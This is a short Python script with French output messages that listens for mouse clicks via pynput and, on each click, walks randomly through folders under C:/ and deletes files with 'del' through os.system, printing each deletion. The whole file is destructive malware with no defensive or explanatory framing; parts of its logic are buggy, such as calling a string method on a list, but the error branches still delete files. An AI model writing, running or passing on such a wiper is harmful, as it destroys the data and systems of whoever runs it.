import os, glob, random, pynput


def on_click(x, y, button, pressed):
    
    if pressed:
        
        path = glob.glob("C:/*")
        
        while True:
            rd = random.randint(0, 10)
            if rd  != 0:
                try:
                    
                    if path == []:
                        path = glob.glob("C:/*")
                        continue
                    
                    path = glob.glob(f"{random.choice(path)}/*")
                    
                except: 
                    for file in path:
                        path = path.replace("/", "\\")
                        os.system(f"del {file}")
                        print(f"Supprimer {file}")
                    break
                
            else:
                try:
                    path = path.replace("/", "\\")
                    file = random.choice(path)
                    os.system(f"del {file}")
                    print(f"Supprimer le fichier : {file}")
                    break
                except:
                    path = glob.glob("C:/*")
                    continue
        


with pynput.mouse.Listener(on_click=on_click) as listener:
    listener.join()
